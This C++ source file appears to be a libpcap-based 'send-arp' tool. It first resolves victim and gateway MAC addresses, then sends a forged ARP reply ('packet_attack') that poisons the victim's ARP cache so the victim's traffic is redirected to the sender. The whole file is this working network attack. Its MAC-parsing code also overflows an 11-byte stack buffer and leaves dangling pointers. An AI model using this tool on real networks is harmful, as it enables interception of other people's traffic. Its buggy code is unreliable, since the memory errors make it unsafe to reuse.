#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdbool.h>
#include <stdio.h>
#include <stdint.h>
#include <netinet/in.h>
#include <fstream>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <iostream>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

//+++++
typedef struct ethernet_header{
	uint8_t ethernet_arr[14];
}ethernet_hdr;
//ethernet_header_size = 14 Bytes

typedef struct arp_header{
	char arp_arr[28];
//arp_header_size = 28 Bytes
}arp_hdr;

char HexToString(char before){
	if(before >= 10){
		before = before - 10 + 'A';
		return before;
	}
	else{
		before = before + '0';
		return before;
	}
}
//+++++

//+++++
bool get_s_ip(char* dev, char* ip){
	struct ifreq ifr;
	int s = socket(AF_INET, SOCK_DGRAM, 0);

	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	ioctl(s, SIOCGIFADDR, &ifr);

	close(s);

	Ip my_ip = Ip(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

	std::string str = std::string(my_ip);

	if (str.length() > 0) {
		strcpy(ip, str.c_str());
		return true;
	}

	return false;
}

bool get_s_mac(char* dev, char* mac){
	std::string mac_addr;
	std::ifstream mac_file("/sys/class/net/" + std::string(dev) + "/address");
	std::string str((std::istreambuf_iterator<char>(mac_file)), std::istreambuf_iterator<char>());

	if(str.length() > 0){
		strcpy(mac, str.c_str());
		return true;
	}

	return false;
}
//+++++

int main(int argc, char* argv[]) {
	if (argc <= 3 || argc%2 == 1) {
		usage();
		return -1;
	}

	int count = (argc - 2)/2;

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	/////
	char s_ip[Ip::SIZE];
	if(get_s_ip(dev, s_ip)){
		printf("My IP address = %s\n", s_ip);
	}
	else{
		printf("Couldn't get my IP address\n");
		return -1;
	}
	std::string s_ip_str = std::string(s_ip);

	char s_mac[Mac::SIZE];
	if(get_s_mac(dev, s_mac)){
		printf("My MAC address = %s\n", s_mac);
	}
	else{
		printf("Couldn't get my MAC address\n");
		return -1;
	}
	/////
	
	
	for(int i=0; i<count; i++){

		/////
		char* you_ip = argv[2+(2*i)];

		EthArpPacket packet_you;
		
		packet_you.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
		packet_you.eth_.smac_ = Mac(s_mac);
		packet_you.eth_.type_ = htons(EthHdr::Arp);
		
		packet_you.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet_you.arp_.pro_ = htons(EthHdr::Ip4);
		packet_you.arp_.hln_ = Mac::SIZE;
		packet_you.arp_.pln_ = Ip::SIZE;
		packet_you.arp_.op_ = htons(ArpHdr::Request);
		packet_you.arp_.smac_ = Mac(s_mac);
		packet_you.arp_.sip_ = htonl(Ip(s_ip));
		packet_you.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet_you.arp_.tip_ = htonl(Ip(you_ip));	

		int res_you = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_you), sizeof(EthArpPacket));
		
		if (res_you != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_you, pcap_geterr(handle));
		}
		/////
		char* gate_ip = argv[3+(2*i)];

		EthArpPacket packet;
		
		packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
		packet.eth_.smac_ = Mac(s_mac);
		packet.eth_.type_ = htons(EthHdr::Arp);
		
		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = Mac(s_mac);
		packet.arp_.sip_ = htonl(Ip(s_ip));
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.tip_ = htonl(Ip(gate_ip));	

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		/////

		/////
		int num_pac = 0;

		char* mac[2];

		while(num_pac < 2){
			struct pcap_pkthdr* header;
			const u_char* packet_1;

			ethernet_hdr* ethernet;
			arp_hdr* arp;

			int res_1 = pcap_next_ex(handle, &header, &packet_1);

			if (res_1 == 0) continue;
			if (res_1 == PCAP_ERROR || res_1 == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res_1, pcap_geterr(handle));
				break;
			}

			ethernet = (ethernet_hdr*) packet_1;
			arp = (arp_hdr*) (packet_1 + 14);

			if(ethernet->ethernet_arr[12] == 0x08 && ethernet->ethernet_arr[13] == 0x06){

				char temp_arr[11];

				mac[num_pac]=temp_arr;

				temp_arr[0] = HexToString((arp->arp_arr[8]>>4)&0x0F);
				temp_arr[1] = HexToString(arp->arp_arr[8]&0x0F);
				temp_arr[2] = ':';
				temp_arr[3] = HexToString((arp->arp_arr[9]>>4)&0x0F);
				temp_arr[4] = HexToString(arp->arp_arr[9]&0x0F);
				temp_arr[5] = ':';
				temp_arr[6] = HexToString((arp->arp_arr[10]>>4)&0x0F);
				temp_arr[7] = HexToString(arp->arp_arr[10]&0x0F);
				temp_arr[8] = ':';
				temp_arr[9] = HexToString((arp->arp_arr[11]>>4)&0x0F);
				temp_arr[10] = HexToString(arp->arp_arr[11]&0x0F);
				temp_arr[11] = ':';
				temp_arr[12] = HexToString((arp->arp_arr[12]>>4)&0x0F);
				temp_arr[13] = HexToString(arp->arp_arr[12]&0x0F);
				temp_arr[14] = ':';
				temp_arr[15] = HexToString((arp->arp_arr[13]>>4)&0x0F);
				temp_arr[16] = HexToString(arp->arp_arr[13]&0x0F);

				printf("%s\n", mac[num_pac]);
				//mac[0] -> "mac" who request relatively later
				//mac[1] -> "mac" who request relatively earlier

				num_pac++;

			}
			
			else{
				continue;
			}
		
		}
		/////


	/////
		EthArpPacket packet_attack;
		
		packet_attack.eth_.dmac_ = Mac(mac[1]);
		packet_attack.eth_.smac_ = Mac(s_mac);
		packet_attack.eth_.type_ = htons(EthHdr::Arp);
		
		packet_attack.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet_attack.arp_.pro_ = htons(EthHdr::Ip4);
		packet_attack.arp_.hln_ = Mac::SIZE;
		packet_attack.arp_.pln_ = Ip::SIZE;
		packet_attack.arp_.op_ = htons(ArpHdr::Reply);
		packet_attack.arp_.smac_ = Mac(s_mac);
		packet_attack.arp_.sip_ = htonl(Ip(gate_ip));
		packet_attack.arp_.tmac_ = Mac(mac[1]);
		packet_attack.arp_.tip_ = htonl(Ip(you_ip));
		
		int res_attack = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_attack), sizeof(EthArpPacket));
		
		if (res_attack != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_attack, pcap_geterr(handle));
		}
	/////
	

		printf("\n");

	}
	//End of "for"


	pcap_close(handle);
}
